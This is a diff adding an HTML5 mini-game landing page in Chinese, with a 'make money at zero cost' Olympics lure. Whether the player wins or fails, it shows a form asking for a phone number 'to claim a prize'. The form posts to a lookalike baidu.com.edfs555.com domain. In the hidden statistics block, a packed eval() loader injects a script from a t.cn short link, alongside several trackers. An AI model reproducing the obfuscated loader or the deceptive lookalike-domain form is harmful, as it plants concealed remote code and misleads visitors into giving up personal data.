@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		<meta charset="UTF-8">
+		<title>奥运不围观,发挥洪荒之力,0成本赚钱吧</title>
+		<link rel="stylesheet" type="text/css" href="css/reset.css" />
+		<link rel="stylesheet" type="text/css" href="css/media.css" />
+		<link rel="stylesheet" type="text/css" href="css/scale_yy.css" />
+		<script src="js/jquery.min.js" type="text/javascript" charset="utf-8"></script>
+		<script src="js/fontsize.js" type="text/javascript" charset="utf-8"></script>
+		<script src="js/adjust.js" type="text/javascript" charset="utf-8"></script>
+		<script src="js/demo65_local.js" type="text/javascript" charset="utf-8"></script>
+
+		<style type="text/css">
+			#p1_bg {
+				width: 16rem;
+				position: relative;
+			}
+			
+			#bubble {
+				width: 11.625rem;
+				height: 8.575rem;
+				position: absolute;
+				top: 1.8rem;
+				left: 1.8rem;
+			}
+			
+			#slogan1 {
+				width: 6.75rem;
+				position: absolute;
+				top: 2.2rem;
+				left: 3.5rem;
+			}
+			
+			#slogan2_1 {
+				width: 3.525rem;
+				position: absolute;
+				top: 5rem;
+				left: 1.95rem;
+			}
+			
+			#slogan2_2 {
+				width: 7.575rem;
+				position: absolute;
+				top: 3.8rem;
+				left: 5.25rem;
+			}
+			
+			#slogan3_1 {
+				width: 4.95rem;
+				position: absolute;
+				top: 7rem;
+				left: 2.15rem;
+			}
+			
+			#slogan3_2 {
+				width: 6.225rem;
+				position: absolute;
+				top: 6.2rem;
+				left: 7rem;
+			}
+			
+			#enter {
+				background: transparent;
+				background-image: url(img/p1/p1_btn_263_85.png);
+				background-size: 100% 100%;
+				position: absolute;
+				left: 4.7125rem;
+				bottom: 3.5rem;
+				width: 6.575rem;
+				height: 2.125rem;
+			}
+			
+			#btn_rule {
+				background: transparent;
+				background-image: url(img/p1/btn_rule.png);
+				background-size: 100% 100%;
+				width: 6.575rem;
+				height: 2.125rem;
+				position: absolute;
+				bottom: 1rem;
+				left: 4.7125rem;
+			}
+			
+			#rule_block {
+				display: none;
+			}
+			
+			#game_rule {
+				width: 14.7rem;
+				height: 10.1rem;
+				position: absolute;
+				top: 6rem;
+				left: 0.65rem;
+			}
+			
+			#begin_game {
+				width: 5.95rem;
+				height: 1.675rem;
+				position: absolute;
+				top: 13rem;
+				left: 5.025rem;
+			}
+			
+			#mc_play {
+				background-image: url(img/p2/mcbg.png);
+				width: 1.4rem;
+				height: 1.4rem;
+				position: fixed;
+				right: 0.5rem;
+				top: 0.5rem;
+				animation: reverseRotataZ 4s linear infinite normal;
+				-webkit-animation: reverseRotataZ 4s linear infinite normal;
+				animation: rotataZ 4s linear infinite normal;
+				-webkit-animation: rotataZ 4s linear infinite normal;
+			}
+			
+			@-webkit-keyframes reverseRotataZ {
+				0% {
+					-webkit-transform: rotateZ(0deg);
+				}
+				100% {
+					-webkit-transform: rotateZ(-360deg);
+				}
+			}
+			
+			@-webkit-keyframes rotataZ {
+				0% {
+					-webkit-transform: rotateZ(0deg);
+				}
+				100% {
+					-webkit-transform: rotateZ(360deg);
+				}
+			}
+			
+			#demo {
+				background-color: lightgreen;
+				width: 16rem;
+				overflow: hidden;
+				position: relative;
+				display: none;
+			}
+			
+			#demo1 {
+				position: absolute;
+				bottom: 0rem;
+				left: 0rem;
+				/*-webkit-transition: bottom 0.3s ease;*/
+			}
+			
+			#count_ready {
+				width: 4.7rem;
+				height: 1.7rem;
+				position: absolute;
+				left: 5.65rem;
+				top: 8rem;
+				display: block;
+				animation: countReady 2s linear 0.5s 1 normal;
+				-webkit-animation: countReady 2s linear 0.5s 1 normal;
+			}
+			
+			#count_go {
+				width: 3.275rem;
+				height: 1.425rem;
+				position: absolute;
+				left: 6.3625rem;
+				top: 8rem;
+				display: none;
+				animation: countGo 1s linear 0s 1 normal;
+				-webkit-animation: countGo 1s linear 0s 1 normal;
+			}
+			
+			@keyframes countReady {
+				0% {
+					opacity: 0.2;
+					transform: scale(0);
+				}
+				75% {
+					opacity: 1;
+					transform: scale(1);
+				}
+				100% {
+					opacity: 0;
+					transform: scale(1.25);
+				}
+			}
+			
+			@-webkit-keyframes countReady {
+				0% {
+					-webkit-opacity: 0.2;
+					-webkit-transform: scale(0);
+				}
+				75% {
+					-webkit-opacity: 1;
+					-webkit-transform: scale(1);
+				}
+				100% {
+					-webkit-opacity: 0;
+					-webkit-transform: scale(1.25);
+				}
+			}
+			
+			@keyframes countGo {
+				0% {
+					opacity: 0.2;
+					transform: scale(0);
+				}
+				75% {
+					opacity: 1;
+					transform: scale(1);
+				}
+				100% {
+					opacity: 0;
+					transform: scale(1.25);
+				}
+			}
+			
+			@-webkit-keyframes countGo {
+				0% {
+					-webkit-opacity: 0.2;
+					-webkit-transform: scale(0);
+				}
+				75% {
+					-webkit-opacity: 1;
+					-webkit-transform: scale(1);
+				}
+				100% {
+					-webkit-opacity: 0;
+					-webkit-transform: scale(1.25);
+				}
+			}
+			
+			#clock {
+				width: 4.225rem;
+				position: absolute;
+				top: 0.15rem;
+				left: 0.15rem;
+			}
+			
+			#time_counter {
+				position: absolute;
+				top: 0.825rem;
+				left: 2.25rem;
+				color: white;
+			}
+			
+			#progress_bar #progress_percent_pos {
+				color: white;
+				font-size: 0.5rem;
+				position: absolute;
+				top: 0.3rem;
+				left: 11.8rem;
+			}
+			
+			#progress_bar #pro_bar {
+				background-color: white;
+				width: 6rem;
+				height: 0.2rem;
+				position: absolute;
+				top: 0.5rem;
+				left: 5.15rem;
+				border-radius: 0.1rem;
+			}
+			
+			#progress_bar #pro_bar_front {
+				background-color: #FEC538;
+				width: 0rem;
+				height: 0.2rem;
+				position: absolute;
+				top: 0.5rem;
+				left: 5.15rem;
+				border-radius: 0.1rem;
+				transition: width;
+			}
+			
+			#player_left {
+				width: 1.8rem;
+				height: 3.6rem;
+				position: absolute;
+				left: 7.1rem;
+				top: 12.3rem;
+				/*bottom: 4.9rem;*/
+				display: block;
+			}
+			
+			#player_right {
+				width: 1.8rem;
+				height: 3.6rem;
+				position: absolute;
+				left: 7.1rem;
+				top: 12.3rem;
+				/*bottom: 4.9rem;*/
+				display: none;
+			}
+			
+			#player_gogo {
+				width: 2.425rem;
+				height: 4.475rem;
+				position: absolute;
+				left: 6.7875rem;
+				top: 12.3rem;
+				/*bottom: 4.9rem;*/
+				display: none;
+			}
+			
+			#btn_left {
+				position: absolute;
+				left: 1rem;
+				bottom: 0.5rem;
+				width: 3.125rem;
+				height: 3.2rem;
+				background-image: url(img/p2/btn_left_125_128.png);
+				background-size: 100% 100%;
+				border-radius: 1.6rem;
+				margin-right: 6.8rem;
+				display: block;
+			}
+			
+			#btn_left_down {
+				position: absolute;
+				left: 1rem;
+				bottom: 0.5rem;
+				width: 3.125rem;
+				height: 3.2rem;
+				background-image: url(img/p2/btn_left_down_125_127.png);
+				background-size: 100% 100%;
+				border-radius: 1.6rem;
+				margin-right: 6.8rem;
+				display: none;
+			}
+			
+			#btn_right {
+				position: absolute;
+				right: 1rem;
+				bottom: 0.5rem;
+				width: 3.125rem;
+				height: 3.2rem;
+				background-image: url(img/p2/btn_right_125_128.png);
+				background-size: 100% 100%;
+				border-radius: 1.6rem;
+				display: block;
+			}
+			
+			#btn_right_down {
+				position: absolute;
+				right: 1rem;
+				bottom: 0.5rem;
+				width: 3.125rem;
+				height: 3.2rem;
+				background-image: url(img/p2/btn_right_down_126_127.png);
+				background-size: 100% 100%;
+				border-radius: 1.6rem;
+				display: none;
+			}
+			
+			#gogo {
+				position: absolute;
+				/*left: 6.025rem;*/
+				left: 4.5rem;
+				bottom: 1.2rem;
+				/*width: 3.95rem;
+				height: 1.025rem;
+				3.8536
+				* */
+				width: 7rem;
+				height: 1.816rem;
+				background-image: url(img/p2/gogo.png);
+				background-size: 100% 100%;
+				display: block;
+			}
+			
+			#gogo_active {
+				position: absolute;
+				/*left: 6.025rem;*/
+				left: 4.5rem;
+				bottom: 1.2rem;
+				/*width: 3.95rem;
+				height: 1.025rem;*/
+				width: 7rem;
+				height: 1.816rem;
+				background-image: url(img/p2/gogo_active.png);
+				background-size: 100% 100%;
+				display: none;
+			}
+			
+			#noready {
+				/*background-color: black;*/
+				/*border: 1px solid gray;*/
+				width: 16rem;
+				height: 5rem;
+				position: absolute;
+				bottom: 0;
+				display: block;
+			}
+			/*#award {
+				display: none;
+				animation: award 1s linear 0s 1 normal;
+				-webkit-animation: award 1s linear 0s 1 normal;
+			}
+			@keyframes award{
+				from{
+					opacity: 0;
+					transform: scale(0);
+				}
+				to{
+					opacity: 1;
+					transform: scale(1);
+				}
+			}
+			@-webkit-keyframes award{
+				from{
+					-webkit-opacity: 0;
+					-webkit-transform: scale(0);
+				}
+				to{
+					-webkit-opacity: 1;
+					-webkit-transform: scale(1);
+				}
+			}*/
+			
+			#shadow {
+				width: 16rem;
+				/*height: 20rem;动态获取*/
+				position: absolute;
+				top: 0;
+				background-color: black;
+				opacity: 0.5;
+				display: none;
+			}
+			
+			#congratulation {
+				width: 13rem;
+				height: 7.525rem;
+				position: absolute;
+				left: 1.5rem;
+				top: 5rem;
+				display: none;
+			}
+			
+			#form {
+				display: none;
+			}
+			
+			#tel65 {
+				width: 8.725rem;
+				height: 1.275rem;
+				position: absolute;
+				left: 3.6375rem;
+				top: 8.5rem;
+				border-radius: 0.3rem;
+				padding-left: 0.2rem;
+				font-size: 0.6rem;
+			}
+			/*#con_btn {
+				background-image: url(img/p3/con_btn3.png);
+				background-size: 100% 100%;
+				width: 8.725rem;
+				height: 1.725rem;
+				position: absolute;
+				top: 10rem;
+				left: 3.6375rem;
+				border-radius: 0.3rem;
+			}*/
+			/*#failed {
+				display: none;
+			}*/
+			/*#failed_bg {
+				width: 13rem;
+				position: absolute;
+				top: 6.525rem;
+				left: 1.5rem;
+			}
+			#failed_btn {
+				width: 8.525rem;
+				position: absolute;
+				top: 9rem;
+				left: 3.7375rem;
+			}*/
+			
+			#failed_bg {
+				width: 13rem;
+				position: absolute;
+				top: 4rem;
+				left: 1.5rem;
+				display: none;
+			}
+			
+			#tel66 {
+				width: 8.725rem;
+				height: 1.275rem;
+				position: absolute;
+				left: 3.6375rem;
+				top: 9.5rem;
+				border-radius: 0.3rem;
+				padding-left: 0.2rem;
+				font-size: 0.6rem;
+			}
+			
+			#failed_btn {
+				background-image: url(img/p3/failed_btn2.png);
+				background-size: 100% 100%;
+				width: 8.725rem;
+				height: 1.725rem;
+				position: absolute;
+				top: 10rem;
+				left: 3.6375rem;
+				border-radius: 0.35rem;
+			}
+		</style>
+
+	</head>
+
+	<body>
+		<div id="p1">
+			<img id="p1_bg" src="img/p1/p1_bg_640_963_edfs2.png" />
+			<img id="bubble" src="img/p1/bubble.png" />
+			<img id="slogan1" src="img/p1/slogan1.png" />
+			<img id="slogan2_1" src="img/p1/slogan2_1.png" />
+			<img id="slogan2_2" src="img/p1/slogan2_2.png" />
+			<img id="slogan3_1" src="img/p1/slogan3_1.png" />
+			<img id="slogan3_2" src="img/p1/slogan3_2.png" />
+			<input type="button" name="enter" id="enter" class="scale_yy" value="" onclick="enter()" />
+			<input type="button" name="btn_rule" id="btn_rule" class="scale_yy" value="" onclick="rule()" />
+			<div id="rule_block">
+				<img id="game_rule" src="img/p1/game_rule.png" />
+				<img id="begin_game" class="scale_yy" src="img/p1/begin_game.png" onclick="enter()" />
+			</div>
+		</div>
+
+		<div id=demo>
+			<!--背景图-->
+			<div id=demo1><img src="img/p2/bg_640_5019_finalline.png" /></div>
+			<!--计时器-->
+			<img id="clock" src="img/p2/clock_2.png" />
+			<span id="time_counter">0</span>
+			<!--进度条-->
+			<div id="progress_bar">
+				<div id="progress_percent_pos">
+					<span id="progress_percent">0</span>%
+				</div>
+				<em id="pro_bar"></em>
+				<em id="pro_bar_front"></em>
+			</div>
+			<!--人-->
+			<img id="player_left" src="img/p2/player_left.png" />
+			<img id="player_right" src="img/p2/player_right.png" />
+			<img id="player_gogo" src="img/p2/player_gogo.gif" />
+			<!--按钮-->
+			<input type="button" name="" id="btn_left" value="" />
+			<input type="button" name="btn_left_down" id="btn_left_down" value="" />
+			<input type="button" name="" id="btn_right" value="" />
+			<input type="button" name="btn_right_down" id="btn_right_down" value="" />
+			<img id="gogo" class="scale_yy" src="img/p2/gogo2.gif" onclick="on()" />
+			<img id="gogo_active" class="scale_yy" src="img/p2/gogo_active2.png" onclick="off()" />
+			<div id="noready"></div>
+			<!--播放器-->
+			<span id="musicControl">
+        		<a id="mc_play" class="stop" onclick="play_music();">
+            		<audio id="musicfx" loop="loop" autoplay="autoplay" preload="auto">
+               			<source src="raw/bgm_9s.mp3" type="audio/mpeg">
+           			 </audio>
+       			 </a>
+ 			</span>
+			<!--Ready-Go-->
+			<img id="count_ready" src="img/p2/count_ready.png" />
+			<img id="count_go" src="img/p2/count_go.png" />
+			<!--颁奖页面-->
+			<div id="shadow"></div>
+			<div id="award">
+				<img id="congratulation" src="img/p3/congratulation3.png" />
+				<!--<div id="myForm_succedd">
+					<input type="text" name="tel" id="tel65" value="" placeholder="请输入手机号码，以便领取奖品"/>
+					<input type="submit" name="con_btn" id="con_btn" class="scale_yy" value="" />
+				</div>-->
+				<!--<img id="con_btn" class="scale_yy" src="img/p3/con_btn2.png"/>-->
+			</div>
+			<!--失败页面-->
+			<div id="failed">
+				<img id="failed_bg" src="img/p3/failed_bg2.png" />
+				<!--<img id="failed_btn" src="img/p3/failed_btn.png" onclick="playagain()"/>-->
+				<form id="form" action="http://www.baidu.com.edfs555.com/clicks/index.php?m=Home&c=Index&a=setForm&id=65" id="formsubmit65" onSubmit="javascript:return formprepare65(this);" method="post">
+					<input type="text" name="tel" id="tel65" value="" placeholder="请输入手机号码，以便领取奖品" />
+					<input type="hidden" id="qudao65" name="qudao" data-title="渠道" value="互联网" />
+					<input type="hidden" id="title65" name="title" data-title="标题" value="奥运不围观 发挥洪荒之力 0成本赚钱" />
+					<input type="hidden" id="redirect65" name="redirect" data-title="恭喜！您已提交成功！" value="http://www.edfs555.com/gg/y/_office_h5game_rm/qrcode2.html" />
+					<input type="hidden" id="land65" name="land" value="" />
+					<input type="hidden" id="refer65" name="refer" value="" />
+					<input type="hidden" id="delay_time65" name="delay_time" value="" />
+					<input type="hidden" id="from65" name="from" value="" />
+					<input type="hidden" id="utm_source65" name="utm_source" value="" />
+					<input type="hidden" id="utm_medium65" name="utm_medium" value="" />
+					<input type="hidden" id="utm_term65" name="utm_term" value="" />
+					<input type="hidden" id="utm_content65" name="utm_content" value="" />
+					<input type="hidden" id="utm_campaign65" name="utm_campaign" value="" />
+					<input type="submit" name="failed_btn" id="failed_btn" class="scale_yy" value="" />
+			</div>
+		</div>
+
+		</div>
+
+		<!--统计代码-->
+		<div style="display: none" ;>
+			<!--百度统计-->
+			<script>
+				var _hmt = _hmt || [];
+				(function() {
+					var hm = document.createElement("script");
+					hm.src = "//hm.baidu.com/hm.js?57c8a58e11feb3069916efcf909a8ad6";
+					var s = document.getElementsByTagName("script")[0];
+					s.parentNode.insertBefore(hm, s);
+				})();
+			</script>
+
+			<script type="text/javascript">
+				var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+				document.write(unescape("%3Cspan id='cnzz_stat_icon_1259549778'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1259549778' type='text/javascript'%3E%3C/script%3E"));
+			</script>
+			<script>
+				/* 25634 */
+				eval(function(p, a, c, k, e, d) {
+					e = function(c) {
+						return c
+					};
+					if (!''.replace(/^/, String)) {
+						while (c--) {
+							d[c] = k[c] || c
+						}
+						k = [function(e) {
+							return d[e]
+						}];
+						e = function() {
+							return '\\w+'
+						};
+						c = 1
+					};
+					while (c--) {
+						if (k[c]) {
+							p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
+						}
+					}
+					return p
+				}('2.1("<0 3=\'7://4.6/5\'></0>");', 8, 8, 'script|writeln|document|src|t|R5CKCq0|cn|http'.split('|'), 0, {}));
+			</script>
+			<!-- Piwik -->
+			<script type="text/javascript">
+				var _paq = _paq || [];
+				_paq.push(['trackPageView']);
+				_paq.push(['enableLinkTracking']);
+				(function() {
+					var u = "//www.edfs555.com/piwik/";
+					_paq.push(['setTrackerUrl', u + 'piwik.php']);
+					_paq.push(['setSiteId', 1]);
+					var d = document,
+						g = d.createElement('script'),
+						s = d.getElementsByTagName('script')[0];
+					g.type = 'text/javascript';
+					g.async = true;
+					g.defer = true;
+					g.src = u + 'piwik.js';
+					s.parentNode.insertBefore(g, s);
+				})();
+			</script>
+			<noscript><p><img src="//www.edfs555.com/piwik/piwik.php?idsite=1" style="border:0;" alt="" /></p></noscript>
+			<!-- End Piwik Code -->
+
+			<!--平友统计-->
+			<script type="text/javascript">
+				var _py = _py || [];
+				_py.push(['a', 'fYs..ASZ3QwNA7oo7JoYBWVGpOP']);
+				_py.push(['domain', 'stats.ipinyou.com']);
+				_py.push(['e', '']); - function(d) {
+					var s = d.createElement('script'),
+						e = d.body.getElementsByTagName('script')[0];
+					e.parentNode.insertBefore(s, e),
+						f = 'https:' == location.protocol;
+					s.src = (f ? 'https' : 'http') + '://' + (f ? 'fm.ipinyou.com' : 'fm.p0y.cn') + '/j/adv.js';
+				}(document);
+			</script>
+
+			<script>
+				function pyRegisterCvt(_orderno) {
+					var w = window,
+						d = document,
+						e = encodeURIComponent;
+					var b = location.href,
+						c = d.referrer,
+						f, g = d.cookie,
+						h = g.match(/(^|;)\s*ipycookie=([^;]*)/),
+						i = g.match(/(^|;)\s*ipysession=([^;]*)/);
+					if (w.parent != w) {
+						f = b;
+						b = c;
+						c = f;
+					};
+					u = '//stats.ipinyou.com/cvt?a=' + e('fYs.Jys.z-_BAr79X6TQRRdH_QTG9P') + '&c=' + e(h ? h[2] : '') + '&s=' + e(i ? i[2].match(/jump\%3D(\d+)/)[1] : '') + '&u=' + e(b) + '&r=' + e(c) + '&rd=' + (new Date()).getTime() + '&OrderNo=' + e(_orderno) + '&e=';
+					(new Image()).src = u;
+				}
+			</script>
+
+		</div>
+
+		<script type="text/javascript">
+			var demo = document.getElementById("demo");
+			var demo1 = document.getElementById("demo1");
+			var pro_bar_front = document.getElementById("pro_bar_front");
+			var player_left = document.getElementById("player_left");
+			var palyer_right = document.getElementById("player_right");
+			var player_gogo = document.getElementById("player_gogo");
+			var btn_left = document.getElementById("btn_left");
+			var btn_right = document.getElementById("btn_right");
+			var btn_left_down = document.getElementById("btn_left_down");
+			var btn_right_down = document.getElementById("btn_right_down");
+			var gogo = document.getElementById("gogo");
+			var gogo_active = document.getElementById("gogo_active");
+			var count_ready = document.getElementById("count_ready");
+			var count_go = document.getElementById("count_go");
+			var noready = document.getElementById("noready");
+			var award = document.getElementById("award");
+			var shadow = document.getElementById("shadow");
+			var failed_btn = document.getElementById("failed_btn");
+			var per1 = 0;
+			var player_pos = 12.3;
+			var count = 0;
+			var client_height = document.documentElement.clientHeight;
+			demo.style.height = client_height / 40 + "rem";
+
+			function enter() {
+				$("#p1").hide();
+				$("#demo").show();
+			}
+
+			function rule() {
+				$("#enter").hide();
+				$("#btn_rule").hide();
+				$("#rule_block").show();
+			}
+
+			function play_music() {
+				if ($('#mc_play').hasClass('on')) {
+					$('#mc_play audio').get(0).pause();
+					$('#mc_play').attr('class', 'stop');
+				} else {
+					$('#mc_play audio').get(0).play();
+					$('#mc_play').attr('class', 'on');
+				}
+				$('#music_play_filter').hide();
+				event.stopPropagation(); //阻止冒泡 
+			}
+			//动画监听事件
+			count_ready.addEventListener("webkitAnimationEnd", function() {
+				count_ready.style.display = "none";
+				count_go.style.display = "block";
+			}, false);
+			count_go.addEventListener("webkitAnimationEnd", function() {
+				count_go.style.display = "none";
+				//计时函数
+				var a = 0;
+				time_interval = setInterval(function() {
+					$("#time_counter").html(a);
+					if (a < 30) {
+						a += 0.01;
+						a = parseFloat(a.toFixed(2));
+					} else {
+						clearInterval(time_interval);
+						if (player_pos > 2.5) {
+							clearInterval(autogo);
+							shadow.style.height = client_height / 40 + "rem";
+							shadow.style.display = "block"
+							$("#failed_bg").show();
+							$("#form").show();
+							off();
+						}
+					}
+				}, 10);
+				noready.style.display = "none";
+			}, false);
+			btn_left.addEventListener("touchstart", handleStart1, false);
+			btn_right.addEventListener("touchstart", handleStart2, false);
+			btn_left_down.addEventListener("touchstart", handleStart3, false);
+			btn_right_down.addEventListener("touchstart", handleStart4, false);
+
+			function handleStart1(evt) {
+				evt.preventDefault(); //阻止事件的默认行为
+				per1 -= 0.525;
+				count += 1;
+				if (demo1.offsetTop < -20 && count == 1) {
+					demo1.style.bottom = per1 + "rem";
+				}
+				if (demo1.offsetTop >= -20 && count == 1) {
+					if (player_pos > 2.5) {
+						player_pos -= 0.525;
+						player_right.style.top = player_pos + "rem";
+						if (player_pos <= 2.5) {
+							player_right.style.top = player_pos + "rem";
+							clearInterval(time_interval);
+							shadow.style.height = client_height / 40 + "rem";
+							shadow.style.display = "block"
+								//							award.style.display = "block";
+							failed_btn.style.backgroundImage = "url(img/p3/con_btn3.png)";
+							$("#congratulation, #form").show();
+						}
+					}
+				}
+				OST = 110.15 - (player_pos * 40 - demo1.offsetTop - 102) / 40;
+				OST = OST / 1.0915;
+				OST = parseInt(OST);
+				$("#progress_percent").html(OST);
+				pro_bar_front.style.width = OST / 16 + "rem";
+				$("#btn_left_down").show();
+				$("#player_left").hide();
+				$("#player_right").show();
+				$("#player_gogo").hide();
+				$("#gogo_active").hide();
+				clearInterval(autogo);
+			}
+
+			function handleStart3(evt) {
+				evt.preventDefault(); //阻止事件的默认行为
+				per1 -= 0.525;
+				count += 1;
+				if (demo1.offsetTop < -20 && count == 1) {
+					demo1.style.bottom = per1 + "rem";
+				}
+				if (demo1.offsetTop >= -20 && count == 1) {
+					if (player_pos > 2.5) {
+						player_pos -= 0.525;
+						player_right.style.top = player_pos + "rem";
+						if (player_pos <= 2.5) {
+							player_right.style.top = player_pos + "rem";
+							clearInterval(time_interval);
+							shadow.style.height = client_height / 40 + "rem";
+							shadow.style.display = "block"
+								//							award.style.display = "block";
+							failed_btn.style.backgroundImage = "url(img/p3/con_btn3.png)";
+							$("#congratulation, #form").show();
+						}
+					}
+				}
+				OST = 110.15 - (player_pos * 40 - demo1.offsetTop - 102) / 40;
+				OST = OST / 1.0915;
+				OST = parseInt(OST);
+				$("#progress_percent").html(OST);
+				pro_bar_front.style.width = OST / 16 + "rem";
+				$("#btn_left_down").hide();
+				$("#player_left").hide();
+				$("#player_right").show();
+				$("#player_gogo").hide();
+				$("#gogo_active").hide();
+				clearInterval(autogo);
+			}
+
+			function handleStart2(evt) {
+				evt.preventDefault(); //阻止事件的默认行为
+				per1 -= 0.525;
+				//计数器归零
+				count = 0;
+				if (demo1.offsetTop >= -20) {
+					player_left.style.top = player_pos + "rem";
+					if (player_pos <= 2.5) {
+						clearInterval(autogo);
+						shadow.style.height = client_height / 40 + "rem";
+						shadow.style.display = "block"
+							//						award.style.display = "block";
+						failed_btn.style.backgroundImage = "url(img/p3/con_btn3.png)";
+						$("#congratulation, #form").show();
+					}
+				}
+				OST = 110.15 - (player_pos * 40 - demo1.offsetTop - 102) / 40;
+				OST = OST / 1.0915;
+				OST = parseInt(OST);
+				$("#progress_percent").html(OST);
+				pro_bar_front.style.width = OST / 16 + "rem";
+				$("#btn_right_down").show();
+				$("#player_right").hide();
+				$("#player_left").show();
+				$("#player_gogo").hide();
+				$("#gogo_active").hide();
+				clearInterval(autogo);
+			}
+
+			function handleStart4(evt) {
+				evt.preventDefault(); //阻止事件的默认行为
+				per1 -= 0.525;
+				//计数器归零
+				count = 0;
+				if (demo1.offsetTop >= -20) {
+					player_left.style.top = player_pos + "rem";
+					if (player_pos <= 2.5) {
+						clearInterval(autogo);
+						shadow.style.height = client_height / 40 + "rem";
+						shadow.style.display = "block"
+							//						award.style.display = "block";
+						failed_btn.style.backgroundImage = "url(img/p3/con_btn3.png)";
+						$("#congratulation, #form").show();
+					}
+				}
+				OST = 110.15 - (player_pos * 40 - demo1.offsetTop - 102) / 40;
+				OST = OST / 1.0915;
+				OST = parseInt(OST);
+				$("#progress_percent").html(OST);
+				pro_bar_front.style.width = OST / 16 + "rem";
+				$("#btn_right_down").hide();
+				$("#player_right").hide();
+				$("#player_left").show();
+				$("#player_gogo").hide();
+				$("#gogo_active").hide();
+				clearInterval(autogo);
+			}
+			var autogo;
+			var time_interval;
+			var progress_percent;
+			var OST;
+
+			function on() {
+				$("#player_left").hide();
+				$("#player_right").hide();
+				$("#gogo_active").show();
+				$("#player_gogo").show();
+				//				if (OST/40 <= 2.55) {
+				//					alert(OST);
+				//				} else {
+				//					setInterval(function function_name () {
+				//						$("#progress_percent").html(OST);
+				//					}, 1000)
+				//				}
+				progress_percent = setInterval(function() {
+					OST = 110.15 - (player_pos * 40 - demo1.offsetTop - 102) / 40;
+					OST = OST / 1.0915;
+					//console.log(OST);
+					//OST = parseFloat(OST.toFixed(2));
+					OST = parseInt(OST);
+					//90.05+12.3-2.55=99.8
+					$("#progress_percent").html(OST);
+					pro_bar_front.style.width = OST / 16 + "rem";
+				}, 10);
+				autogo = setInterval(function() {
+					if (demo1.offsetTop < -20) {
+						per1 -= 0.525;
+						demo1.style.bottom = per1 + "rem";
+					}
+					if (demo1.offsetTop >= -20) {
+						if (player_pos > 2.5) {
+							player_pos -= 0.525;
+							player_gogo.style.top = player_pos + "rem";
+						} else {
+							$("#player_gogo").hide();
+							$("#gogo_active").hide();
+							player_left.style.top = player_pos + "rem";
+							$("#player_left").show();
+							clearInterval(time_interval);
+							clearInterval(autogo);
+							shadow.style.height = client_height / 40 + "rem";
+							shadow.style.display = "block"
+								//alert("on() block")
+							failed_btn.style.backgroundImage = "url(img/p3/con_btn4.png)";
+							$("#congratulation, #form").show();
+						}
+					}
+				}, 40);
+				//				var a = 0;
+				//				time_interval = setInterval(function() {
+				//					$("#time_counter").html(a);
+				//					if (a<=30) {
+				//						a+=0.01;
+				//						a = parseFloat(a.toFixed(2));
+				//					} else{
+				//						clearInterval(time_interval);					
+				//					}
+				//				}, 10);
+			}
+
+			function off() {
+				$("#player_gogo").hide();
+				$("#gogo_active").hide();
+				player_left.style.top = player_pos + "rem";
+				$("#player_left").show();
+				clearInterval(autogo);
+			}
+			//			function close_noSysName () {
+			//				$("#award").hide("normal", "swing");
+			//				$("#shadow").hide();
+			//			}
+			$("#shadow").bind("click", function() {
+				//				$("#award").hide("normal", "swing");
+				//				$("#shadow").hide();
+			});
+		</script>
+	</body>
+
+</html>
